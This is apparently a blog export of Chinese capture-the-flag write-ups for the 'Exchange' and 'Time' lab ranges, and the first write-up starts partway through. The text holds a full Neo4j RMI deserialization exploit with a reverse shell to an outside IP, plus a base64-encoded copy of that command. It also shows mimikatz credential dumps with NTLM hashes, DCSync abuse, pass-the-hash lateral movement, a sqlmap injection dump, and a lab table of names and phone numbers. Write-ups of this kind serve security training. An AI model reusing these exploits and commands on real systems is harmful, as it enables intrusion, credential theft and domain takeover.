ActiveXObject(\u0026#34;WScript.Shell\u0026#34;).exec(\u0026#34;whoami\u0026#34;).stdout.readall())\u0026#39; -k 写用户RDP上去拿flag\nnet user xrntkk abc123456 /add\rnet localgroup administrators xrntkk /add 1Yb dP 88 db dP\u0026#34;Yb 88\u0026#34;\u0026#34;Yb db 88b 88 dP\u0026#34;\u0026#34;b8 2 YbdP 88 dPYb dP Yb 88__dP dPYb 88Yb88 dP `\u0026#34; 3 dPYb 88 dP__Yb Yb dP 88\u0026#34;Yb dP__Yb 88 Y88 Yb \u0026#34;88 4dP Yb 88 dP\u0026#34;\u0026#34;\u0026#34;\u0026#34;Yb YbodP 88 Yb dP\u0026#34;\u0026#34;\u0026#34;\u0026#34;Yb 88 Y8 YboodP 5 6 7 / / 8 / / _ __ ( ) ___ 9 / / // / / // ) ) ) ) / / // ) ) 10 / / // / / // / / / / / / // / / 11/ /____/ / ((___( ( // / / / / / / ((___( ( 12 13 14 15flag02: flag{aefcc6d0-0d3c-44aa-b96c-c8ad50e6d2d4} FLAG4 信息收集一手\n这是域内的一台机子\n接着传个mimikatz，抓取哈希\n用管理员打开mimikatz\nlog\rprivilege::Debug sekurlsa::logonpasswords exit 抓到两个hash\n一个是机器用户的hash，一个是用户zhangtong\nAuthentication Id : 0 ; 10480581 (00000000:009febc5)\rSession : Interactive from 3\rUser Name : DWM-3\rDomain : Window Manager\rLogon Server : (null)\rLogon Time : 2025/4/9 20:32:31\rSID : S-1-5-90-0-3\rmsv :\r[00000003] Primary\r* Username : XIAORANG-EXC01$\r* Domain : XIAORANG\r* NTLM : 9b2081c3dc250a9b0a55c54c4dcc9cbb\r* SHA1 : 336d62cd7f3bc62aba936763ace82491e96f2eed\rAuthentication Id : 0 ; 105924 (00000000:00019dc4)\rSession : Service from 0\rUser Name : Zhangtong\rDomain : XIAORANG\rLogon Server : XIAORANG-WIN16\rLogon Time : 2025/4/9 19:36:36\rSID : S-1-5-21-533686307-2117412543-4200729784-1147\rmsv :\r[00000003] Primary\r* Username : Zhangtong\r* Domain : XIAORANG\r* NTLM : 22c7f81993e96ac83ac2f3f1903de8b4\r* SHA1 : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e\r* DPAPI : ed14c3c4ef895b1d11b04fb4e56bb83b 接下来利用system权限用bloodhound信息收集一波\nproxychains4 bloodhound-python -u \u0026#34;XIAORANG-EXC01$\u0026#34; --hashes :9b2081c3dc250a9b0a55c54c4dcc9cbb -d xiaorang.lab -dc XIAORANG-WIN16.xiaorang.lab -c all --dns-tcp -ns 172.22.3.2 --auth-method ntlm --zip 发现这台机子对域内的用户具有WriteDACL权限，也就是说我们可以利用机器用户给域内的用户添加dcsync权限，从而拿到域管的hash。\npython dacledit.py xiaorang.lab/XIAORANG-EXC01$ -hashes :9b2081c3dc250a9b0a55c54c4dcc9cbb -action write -rights DCSync -principal XIAORANG-EXC01$ -target-dn \u0026#34;DC=xiaorang,DC=lab\u0026#34; -dc-ip 172.22.3.2 接下来我们就可以利用dcsync去dump域管的hash了\nproxychains4 python3 psexec.py xiaorang.lab/XIAORANG-EXC01\\$@172.22.3.9 -hashes \u0026#39;:9b2081c3dc250a9b0a55c54c4dcc9cbb\u0026#39; -codec gbk c:\\\u0026gt; .\\mimikatz.exe \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit\r.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\r.## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo)\r## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz\r\u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com )\r\u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/\rmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\r[DC] \u0026#39;xiaorang.lab\u0026#39; will be the domain\r[DC] \u0026#39;XIAORANG-WIN16.xiaorang.lab\u0026#39; will be the DC server\r[DC] Exporting domain \u0026#39;xiaorang.lab\u0026#39;\r[rpc] Service : ldap\r[rpc] AuthnSvc : GSS_NEGOTIATE (9)\r502 krbtgt b8fa79a52e918cb0cbcd1c0ede492647 514\r1137 HealthMailboxeda7a84 1e89e23e265bb7b54dc87938b1b1a131 66048\r1138 HealthMailbox33b01cf 0eff3de35019c2ee10b68f48941ac50d 66048\r1139 HealthMailbox9570292 e434c7db0f0a09de83f3d7df25ec2d2f 66048\r1140 HealthMailbox3479a75 c43965ecaa92be22c918e2604e7fbea0 66048\r1141 HealthMailbox2d45c5b 4822b67394d6d93980f8e681c452be21 66048\r1142 HealthMailboxec2d542 147734fa059848c67553dc663782e899 66048\r1143 HealthMailboxf5f7dbd e7e4f69b43b92fb37d8e9b20848e6b66 66048\r1144 HealthMailbox67dc103 4fe68d094e3e797cfc4097e5cca772eb 66048\r1145 HealthMailbox320fc73 0c3d5e9fa0b8e7a830fcf5acaebe2102 66048\r1146 Lumia 862976f8b23c13529c2fb1428e710296 512\r500 Administrator 7acbc09a6c0efd81bfa7d5a1d4238beb 512\r1000 XIAORANG-WIN16$ 5410e4604b240a6d7bab43f67637b109 532480\r1147 Zhangtong 22c7f81993e96ac83ac2f3f1903de8b4 512\r1103 XIAORANG-EXC01$ 9b2081c3dc250a9b0a55c54c4dcc9cbb 4096\r1104 XIAORANG-PC$ fc840d385551c896c88c32a65ab5c5ad 4096\r1135 HealthMailbox8446c5b a79a671473279d21ca92fcc8251ec143 66048\r1136 HealthMailbox0d5918e 0e9b8e002d34d405e866b4820dfe36eb 66048\rmimikatz(commandline) # exit\rBye! 拿到域管hash，那我们接下来就可以随意横向了\n500 Administrator 7acbc09a6c0efd81bfa7d5a1d4238beb 512 横向拿flag\nproxychains4 python3 psexec.py administrator@172.22.3.2 -hashes \u0026#39;:7acbc09a6c0efd81bfa7d5a1d4238beb\u0026#39; -codec gbk c:\\Users\\Administrator\\flag\u0026gt; type flag.txt\r____ ___.___ _____ ________ __________ _____ _______ ________\r\\ \\/ /| | / _ \\ \\_____ \\\\______ \\ / _ \\ \\ \\ / _____/\r\\ / | |/ /_\\ \\ / | \\| _/ / /_\\ \\ / | \\/ \\ ___\r/ \\ | / | \\/ | \\ | \\/ | \\/ | \\ \\_\\ \\\r/___/\\ \\|___\\____|__ /\\_______ /____|_ /\\____|__ /\\____|__ /\\______ /\r\\_/ \\/ \\/ \\/ \\/ \\/ \\/\rflag04: flag{204e2d62-c729-4840-8b25-a6c07b6aad44} 拿到flag4\nFLAG3 接下来横向去26拿flag3\nproxychains4 impacket-smbclient -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/administrator@172.22.3.26 -dc-ip 172.22.3.2 use C$\rcd /users/lumia/desktop 在C:\\users\\lumia\\desktop找到一个secret.zip，我们把它get下来\nsecret.zip里面有个flag.docx\n但是secret.zip需要密码\n这里要利用上面拿到的lumia的hash，将outlook中的邮件下载下来\n1146 Lumia 862976f8b23c13529c2fb1428e710296 512 python pthexchange.py --target https://172.22.3.9 --username Lumia --password \u0026#34;00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296\u0026#34; --action Download 拿到两封邮件\n第一封附件是刚刚的secret.zip，提示说用手机号解密\n第二封邮件中附件是一堆名字和手机号\n我们用手机号作为字典进行爆破\n18763918468 拿到flag3\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-exchange-writeup/","summary":"\u003cp\u003e\u003cem\u003e靶标介绍：\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eExchange 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 Flag，分布于不同的靶机。 *注意：该靶场只有4个flag，如果提交完4个flag后仍未攻克成功，请关闭环境提交反馈。\u003c/p\u003e","title":"春秋云镜-Exchange-Writeup"},{"content":"靶标介绍：\nTime是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。\nFLAG1 fscan扫一下\n看到7474，neo4j网页端的默认端口\n登陆默认密码为neo4j/neo4j，登入后可以修改密码\n修改为neo4j/abc123456\n数据版本为3.4.18，打 CVE-2021-34371\nNeo4j 3.4.18 - RMI based Remote Code Execution (RCE) - Java remote Exploit\nexp\n1# Exploit Title: Neo4j 3.4.18 - RMI based Remote Code Execution (RCE) 2# Date: 7/30/21 3# Exploit Author: Christopher Ellis, Nick Gonella, Workday Inc. 4# Vendor Homepage: neo4j.com 5# Software Link: https://neo4j.com/download-thanks/?edition=community\u0026amp;release=3.4.18\u0026amp;flavour=unix 6# Version: 3.4.18 7# Tested on: Windows, Mac 8 9In older versions of Neo4j, when the shell server is enabled, RCE can be obtained via a Java deserialization exploit. In the ShellServer interface, a method setSessionVariable(Serializable paramSerializable, String paramString, Object paramObject) exists. Neo4j also has a dependency (rhino 1.7.9) with known RCE gadget chains. By crafting an object to abuse these gadget chains, one obtain RCE via the shell server. 10 11To create this from scratch using Java, you’ll need to modify the ysoserial library to include the payload found here https://github.com/mozilla/rhino/issues/520 (an update of the existing rhino gadget) as well as modify the ysoserial POM file to include the correct version of rhino. Rebuild ysoserial and include it on your exploit’s classpath. From there, you can use the ShellServer interface and associated code found in neo4j-shell-3.4.18.jar to make your client aware of the server’s method stubs. Now you should be able to call the setSessionVariable method from your exploit/client via RMI. 12In your exploit, use ysoserial to generate a payload as follows: Object payload = new RhinoGadget().getObject(COMMAND), and then call the setSessionVariable with the payload in the paramObject parameter. The other two parameters can be anything. This will cause the server to deserialize your payload, triggering the gadget chain, and running your command. 13It is worth noting that we chose to exploit this method and the paramObject parameter as this was the most direct, any method that takes in an Object (other than String or a primitave) is likely vulnerable as well. 14 15package runnable; 16 17import payloads.RhinoGadget; 18import sun.rmi.registry.RegistryImpl_Stub; 19 20import java.io.Serializable; 21import java.rmi.Naming; 22import org.neo4j.shell.ShellServer; 23 24public class ExploitB { 25 26 public static String COMMAND = \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/113.45.175.138/9001 0\u0026gt;\u0026amp;1\u0026#34;; 27 public static String TARGET = \u0026#34;rmi://39.99.229.213:1337\u0026#34;; 28 public static String TARGET_BINDING = \u0026#34;shell\u0026#34;; 29 30 public static void main (String args[]) throws Exception { 31 32 boolean validBinding = checkBinding(TARGET_BINDING, TARGET); 33 if (!validBinding) 34 { 35 System.out.println(\u0026#34;[-] No valid binding found, shell server may not be listening. Exiting\u0026#34;); 36 System.exit(0); 37 } 38 39 System.out.println(\u0026#34;[+] Found valid binding, proceeding to exploit\u0026#34;); 40 ShellServer server = (ShellServer) Naming.lookup(TARGET + \u0026#34;/\u0026#34; + TARGET_BINDING); 41 42 Object payload = new RhinoGadget().getObject(COMMAND); 43 44 //Here server.shutdown may also be callable without auth, just in case the exploit fails and you just want to turn the thing off 45 try { 46 server.setSessionVariable(newClientId(), \u0026#34;anything_here\u0026#34;, payload); 47 } 48 catch (Exception UnmarshalException ) { 49 System.out.println(\u0026#34;[+] Caught an unmarshalled exception, this is expected.\u0026#34;); 50 } 51 System.out.println(\u0026#34;[+] Exploit completed\u0026#34;); 52 53 } 54 55 /** 56 * Just a helper method to validate that the rmi binding we\u0026#39;re looking for is present 57 * @param bindingToCheck the binding you\u0026#39;d like to check for 58 * @param targetToCheck the rmi registry to check against 59 * @return true if the binding is present, false if not 60 */ 61 public static boolean checkBinding(String bindingToCheck, String targetToCheck) { 62 63 System.out.println(\u0026#34;Trying to enumerate server bindings: \u0026#34;); 64 try { 65 RegistryImpl_Stub stub = (RegistryImpl_Stub) Naming.lookup(targetToCheck); 66 67 for (String element : stub.list()) { 68 System.out.println(\u0026#34;Found binding: \u0026#34; + element); 69 if (element.equalsIgnoreCase(bindingToCheck)) 70 return true; 71 } 72 return false; 73 } 74 catch (Exception ex) 75 { 76 return false; 77 } 78 79 } 80 81 public static Serializable newClientId() { 82 return Integer.valueOf(1); 83 } 84 85} 86 或者直接用\nzwjjustdoit/CVE-2021-34371.jar: CVE-2021-34371.jar\n反弹shell\njava -jar rhino_gadget.jar rmi://39.99.229.213:1337 \u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTMuNDUuMTc1LjEzOC85MDAxIDA+JjE=}|{base64,-d}|{bash,-i}\u0026#34; 拿到第一个flag\nneo4j@ubuntu:/$ cat /home/neo4j/f*\rcat /home/neo4j/f*\r██████████ ██ ░░░░░██░░░ ░░ ░██ ██ ██████████ █████ ░██ ░██░░██░░██░░██ ██░░░██\r░██ ░██ ░██ ░██ ░██░███████\r░██ ░██ ░██ ░██ ░██░██░░░░ ░██ ░██ ███ ░██ ░██░░██████\r░░ ░░ ░░░ ░░ ░░ ░░░░░░ flag01: flag{cd636779-1376-41a5-a2ca-9adbee764248}\rDo you know the authentication process of Kerberos? ......This will be the key to your progress. FLAG2 先信息收集一手\n1neo4j@ubuntu:/tmp$ ip addr 21: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 3 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 4 inet 127.0.0.1/8 scope host lo 5 valid_lft forever preferred_lft forever 6 inet6 ::1/128 scope host 7 valid_lft forever preferred_lft forever 82: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc mq state UP group default qlen 1000 9 link/ether 00:16:3e:2f:e7:ab brd ff:ff:ff:ff:ff:ff 10 inet 172.22.6.36/16 brd 172.22.255.255 scope global dynamic eth0 11 valid_lft 315356731sec preferred_lft 315356731sec 12 inet6 fe80::216:3eff:fe2f:e7ab/64 scope link 13 valid_lft forever preferred_lft forever fscan扫一下内网\nfscan -h 172.22.6.0/24 -p 1-65535 -pg -eh 172.22.6.36 1neo4j@ubuntu:/tmp$ fscan -h 172.22.6.0/24 -p 1-65535 -pg -eh 172.22.6.36 2┌──────────────────────────────────────────────┐ 3│ ___ _ │ 4│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 5│ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │ 6│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │ 7│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 8└──────────────────────────────────────────────┘ 9 Fscan Version: 2.0.0 10 11[2025-04-08 11:59:45] [INFO] 暴力破解线程数: 1 12[2025-04-08 11:59:45] [INFO] 开始信息扫描 13[2025-04-08 11:59:45] [INFO] CIDR范围: 172.22.6.0-172.22.6.255 14[2025-04-08 11:59:45] [INFO] 生成IP范围: 172.22.6.0.%!d(string=172.22.6.255) - %!s(MISSING).%!d(MISSING) 15[2025-04-08 11:59:45] [INFO] 解析CIDR 172.22.6.0/24 -\u0026gt; IP范围 172.22.6.0-172.22.6.255 16[2025-04-08 11:59:45] [INFO] 已排除指定主机: 1 个 17[2025-04-08 11:59:45] [INFO] 最终有效主机数量: 255 18[2025-04-08 11:59:45] [INFO] 开始主机扫描 19[2025-04-08 11:59:45] [INFO] 正在尝试无监听ICMP探测... 20[2025-04-08 11:59:45] [INFO] 当前用户权限不足,无法发送ICMP包 21[2025-04-08 11:59:45] [INFO] 切换为PING方式探测... 22[2025-04-08 11:59:45] [SUCCESS] 目标 172.22.6.12 存活 (ICMP) 23[2025-04-08 11:59:48] [SUCCESS] 目标 172.22.6.25 存活 (ICMP) 24[2025-04-08 11:59:48] [SUCCESS] 目标 172.22.6.38 存活 (ICMP) 25[2025-04-08 11:59:51] [INFO] 存活主机数量: 3 26[2025-04-08 11:59:51] [INFO] 有效端口数量: 65535 27[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.38:22 28[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.12:53 29[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.38:80 30[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.12:88 31[2025-04-08 11:59:51] [SUCCESS] 服务识别 172.22.6.38:22 =\u0026gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.] 32[2025-04-08 11:59:51] [SUCCESS] 端口开放 172.22.6.12:135 33[2025-04-08 11:59:52] [SUCCESS] 端口开放 172.22.6.12:139 34[2025-04-08 11:59:52] [SUCCESS] 端口开放 172.22.6.25:139 35[2025-04-08 11:59:52] [SUCCESS] 端口开放 172.22.6.25:135 36[2025-04-08 11:59:55] [SUCCESS] 端口开放 172.22.6.12:389 37[2025-04-08 11:59:56] [SUCCESS] 端口开放 172.22.6.12:445 38[2025-04-08 11:59:56] [SUCCESS] 端口开放 172.22.6.25:445 39[2025-04-08 11:59:56] [SUCCESS] 端口开放 172.22.6.12:464 40[2025-04-08 11:59:56] [SUCCESS] 服务识别 172.22.6.12:88 =\u0026gt; 41[2025-04-08 11:59:56] [SUCCESS] 服务识别 172.22.6.38:80 =\u0026gt; [http] 42[2025-04-08 11:59:57] [SUCCESS] 端口开放 172.22.6.12:593 43[2025-04-08 11:59:57] [SUCCESS] 端口开放 172.22.6.12:636 44[2025-04-08 11:59:57] [SUCCESS] 服务识别 172.22.6.12:593 =\u0026gt; [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0] 45[2025-04-08 11:59:57] [SUCCESS] 服务识别 172.22.6.12:636 =\u0026gt; 46[2025-04-08 11:59:57] [SUCCESS] 服务识别 172.22.6.12:139 =\u0026gt; Banner:[.] 47[2025-04-08 11:59:57] [SUCCESS] 服务识别 172.22.6.25:139 =\u0026gt; Banner:[.] 48[2025-04-08 11:59:58] [SUCCESS] 端口开放 172.22.6.12:3268 49[2025-04-08 11:59:58] [SUCCESS] 端口开放 172.22.6.12:3269 50[2025-04-08 11:59:58] [SUCCESS] 服务识别 172.22.6.12:3269 =\u0026gt; 51[2025-04-08 11:59:59] [SUCCESS] 端口开放 172.22.6.12:3389 52[2025-04-08 11:59:59] [SUCCESS] 端口开放 172.22.6.25:3389 53[2025-04-08 12:00:00] [SUCCESS] 服务识别 172.22.6.12:389 =\u0026gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name 54[2025-04-08 12:00:01] [SUCCESS] 服务识别 172.22.6.12:445 =\u0026gt; 55[2025-04-08 12:00:01] [SUCCESS] 服务识别 172.22.6.25:445 =\u0026gt; 56[2025-04-08 12:00:02] [SUCCESS] 服务识别 172.22.6.12:464 =\u0026gt; 57[2025-04-08 12:00:03] [SUCCESS] 服务识别 172.22.6.12:3268 =\u0026gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name 58[2025-04-08 12:00:04] [SUCCESS] 服务识别 172.22.6.25:3389 =\u0026gt; 59[2025-04-08 12:00:15] [SUCCESS] 端口开放 172.22.6.12:9389 60[2025-04-08 12:00:20] [SUCCESS] 服务识别 172.22.6.12:9389 =\u0026gt; 61[2025-04-08 12:00:40] [SUCCESS] 端口开放 172.22.6.12:15774 62[2025-04-08 12:00:40] [SUCCESS] 端口开放 172.22.6.25:15774 63[2025-04-08 12:00:51] [SUCCESS] 服务识别 172.22.6.12:15774 =\u0026gt; 64[2025-04-08 12:00:51] [SUCCESS] 服务识别 172.22.6.25:15774 =\u0026gt; 65[2025-04-08 12:00:51] [SUCCESS] 服务识别 172.22.6.12:53 =\u0026gt; 66[2025-04-08 12:00:57] [SUCCESS] 服务识别 172.22.6.12:135 =\u0026gt; 67[2025-04-08 12:00:57] [SUCCESS] 服务识别 172.22.6.25:135 =\u0026gt; 68[2025-04-08 12:01:04] [SUCCESS] 服务识别 172.22.6.12:3389 =\u0026gt; 69[2025-04-08 12:02:16] [SUCCESS] 端口开放 172.22.6.25:47001 70[2025-04-08 12:02:16] [SUCCESS] 端口开放 172.22.6.12:47001 71[2025-04-08 12:02:21] [SUCCESS] 服务识别 172.22.6.25:47001 =\u0026gt; [http] 72[2025-04-08 12:02:21] [SUCCESS] 服务识别 172.22.6.12:47001 =\u0026gt; [http] 73[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49664 74[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49666 75[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49665 76[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49665 77[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49664 78[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49667 79[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49667 80[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49666 81[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49668 82[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49669 83[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.25:49670 84[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49671 85[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49674 86[2025-04-08 12:02:22] [SUCCESS] 端口开放 172.22.6.12:49675 87[2025-04-08 12:02:22] [SUCCESS] 服务识别 172.22.6.12:49674 =\u0026gt; [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0] 88[2025-04-08 12:02:23] [SUCCESS] 端口开放 172.22.6.25:49675 89[2025-04-08 12:02:23] [SUCCESS] 端口开放 172.22.6.25:49676 90[2025-04-08 12:02:23] [SUCCESS] 端口开放 172.22.6.12:49678 91[2025-04-08 12:02:23] [SUCCESS] 端口开放 172.22.6.12:49687 92[2025-04-08 12:02:23] [SUCCESS] 端口开放 172.22.6.12:49772 93[2025-04-08 12:02:34] [SUCCESS] 端口开放 172.22.6.12:54921 94[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49664 =\u0026gt; 95[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49666 =\u0026gt; 96[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49665 =\u0026gt; 97[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49665 =\u0026gt; 98[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49664 =\u0026gt; 99[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49667 =\u0026gt; 100[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49667 =\u0026gt; 101[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49666 =\u0026gt; 102[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49668 =\u0026gt; 103[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49669 =\u0026gt; 104[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.25:49670 =\u0026gt; 105[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49671 =\u0026gt; 106[2025-04-08 12:03:17] [SUCCESS] 服务识别 172.22.6.12:49675 =\u0026gt; 107[2025-04-08 12:03:18] [SUCCESS] 服务识别 172.22.6.25:49675 =\u0026gt; 108[2025-04-08 12:03:18] [SUCCESS] 服务识别 172.22.6.25:49676 =\u0026gt; 109[2025-04-08 12:03:18] [SUCCESS] 服务识别 172.22.6.12:49678 =\u0026gt; 110[2025-04-08 12:03:18] [SUCCESS] 服务识别 172.22.6.12:49687 =\u0026gt; 111[2025-04-08 12:03:18] [SUCCESS] 服务识别 172.22.6.12:49772 =\u0026gt; 112[2025-04-08 12:03:29] [SUCCESS] 服务识别 172.22.6.12:54921 =\u0026gt; 113[2025-04-08 12:03:29] [INFO] 存活端口数量: 43 114[2025-04-08 12:03:29] [INFO] 开始漏洞扫描 115[2025-04-08 12:03:29] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, rdp, smb, smb2, smbghost, ssh, webpoc, webtitle 116[2025-04-08 12:03:29] [SUCCESS] NetInfo 扫描结果 117目标主机: 172.22.6.12 118主机名: DC-PROGAME 119发现的网络接口: 120 IPv4地址: 121 └─ 172.22.6.12 122[2025-04-08 12:03:29] [SUCCESS] NetInfo 扫描结果 123目标主机: 172.22.6.25 124主机名: WIN2019 125发现的网络接口: 126 IPv4地址: 127 └─ 172.22.6.25 128[2025-04-08 12:03:29] [SUCCESS] NetBios 172.22.6.25 XIAORANG\\WIN2019 129[2025-04-08 12:03:29] [SUCCESS] 网站标题 http://172.22.6.38 状态码:200 长度:1531 标题:后台登录 130[2025-04-08 12:03:29] [INFO] 系统信息 172.22.6.12 [Windows Server 2016 Datacenter 14393] 131[2025-04-08 12:03:29] [SUCCESS] NetBios 172.22.6.12 DC:DC-PROGAME.xiaorang.lab Windows Server 2016 Datacenter 14393 扫出来三台机子\n172.22.6.12 DC-PROGAME [Windows Server 2016 Datacenter 14393]\r172.22.6.25 WIN2019\r172.22.6.38 先来看172.22.6.38\n有一个后台登录\n这里存在sql注入，用sqlmap把所有数据dump下来\nproxychains4 sqlmap -u http://172.22.6.38/index.php -data \u0026#34;username=admin\u0026amp;password=*\u0026#34; --dump FLAG2\n[1 entry]\r+----+--------------------------------------------+\r| id | flag02 |\r+----+--------------------------------------------+\r| 1 | flag{b142f5ce-d9b8-4b73-9012-ad75175ba029} |\r+----+--------------------------------------------+ 用户信息\n这里只显示最后256行结果，但是sqlmap会将完整结果储存为csv\n1[12:28:43] [INFO] table \u0026#39;oa_db.oa_users\u0026#39; dumped to CSV file \u0026#39;/root/.local/share/sqlmap/output/172.22.6.38/dump/oa_db/oa_users.csv\u0026#39; [500 entries]\r+-----+----------------------------+-------------+-----------------+\r| id | email | phone | username |\r+-----+----------------------------+-------------+-----------------+\r[12:28:43] [WARNING] console output will be trimmed to last 256 rows due to large table size\r| 245 | chenyan@xiaorang.lab | 18281528743 | CHEN YAN |\r| 246 | tanggui@xiaorang.lab | 18060615547 | TANG GUI |\r| 247 | buning@xiaorang.lab | 13046481392 | BU NING |\r| 248 | beishu@xiaorang.lab | 18268508400 | BEI SHU |\r| 249 | shushi@xiaorang.lab | 17770383196 | SHU SHI |\r| 250 | fuyi@xiaorang.lab | 18902082658 | FU YI |\r| 251 | pangcheng@xiaorang.lab | 18823789530 | PANG CHENG |\r| 252 | tonghao@xiaorang.lab | 13370873526 | TONG HAO |\r| 253 | jiaoshan@xiaorang.lab | 15375905173 | JIAO SHAN |\r| 254 | dulun@xiaorang.lab | 13352331157 | DU LUN |\r| 255 | kejuan@xiaorang.lab | 13222550481 | KE JUAN |\r| 256 | gexin@xiaorang.lab | 18181553086 | GE XIN |\r| 257 | lugu@xiaorang.lab | 18793883130 | LU GU |\r| 258 | guzaicheng@xiaorang.lab | 15309377043 | GU ZAI CHENG |\r| 259 | feicai@xiaorang.lab | 13077435367 | FEI CAI |\r| 260 | ranqun@xiaorang.lab | 18239164662 | RAN QUN |\r| 261 | zhouyi@xiaorang.lab | 13169264671 | ZHOU YI |\r| 262 | shishu@xiaorang.lab | 18592890189 | SHI SHU |\r| 263 | yanyun@xiaorang.lab | 15071085768 | YAN YUN |\r| 264 | chengqiu@xiaorang.lab | 13370162980 | CHENG QIU |\r| 265 | louyou@xiaorang.lab | 13593582379 | LOU YOU |\r| 266 | maqun@xiaorang.lab | 15235945624 | MA QUN |\r| 267 | wenbiao@xiaorang.lab | 13620643639 | WEN BIAO |\r| 268 | weishengshan@xiaorang.lab | 18670502260 | WEI SHENG SHAN |\r| 269 | zhangxin@xiaorang.lab | 15763185760 | ZHANG XIN |\r| 270 | chuyuan@xiaorang.lab | 18420545268 | CHU YUAN |\r| 271 | wenliang@xiaorang.lab | 13601678032 | WEN LIANG |\r| 272 | yulvxue@xiaorang.lab | 18304374901 | YU LV XUE |\r| 273 | luyue@xiaorang.lab | 18299785575 | LU YUE |\r| 274 | ganjian@xiaorang.lab | 18906111021 | GAN JIAN |\r| 275 | pangzhen@xiaorang.lab | 13479328562 | PANG ZHEN |\r| 276 | guohong@xiaorang.lab | 18510220597 | GUO HONG |\r| 277 | lezhong@xiaorang.lab | 15320909285 | LE ZHONG |\r| 278 | sheweiyue@xiaorang.lab | 13736399596 | SHE WEI YUE |\r| 279 | dujian@xiaorang.lab | 15058892639 | DU JIAN |\r| 280 | lidongjin@xiaorang.lab | 18447207007 | LI DONG JIN |\r| 281 | hongqun@xiaorang.lab | 15858462251 | HONG QUN |\r| 282 | yexing@xiaorang.lab | 13719043564 | YE XING |\r| 283 | maoda@xiaorang.lab | 13878840690 | MAO DA |\r| 284 | qiaomei@xiaorang.lab | 13053207462 | QIAO MEI |\r| 285 | nongzhen@xiaorang.lab | 15227699960 | NONG ZHEN |\r| 286 | dongshu@xiaorang.lab | 15695562947 | DONG SHU |\r| 287 | zhuzhu@xiaorang.lab | 13070163385 | ZHU ZHU |\r| 288 | jiyun@xiaorang.lab | 13987332999 | JI YUN |\r| 289 | qiguanrou@xiaorang.lab | 15605983582 | QI GUAN ROU |\r| 290 | yixue@xiaorang.lab | 18451603140 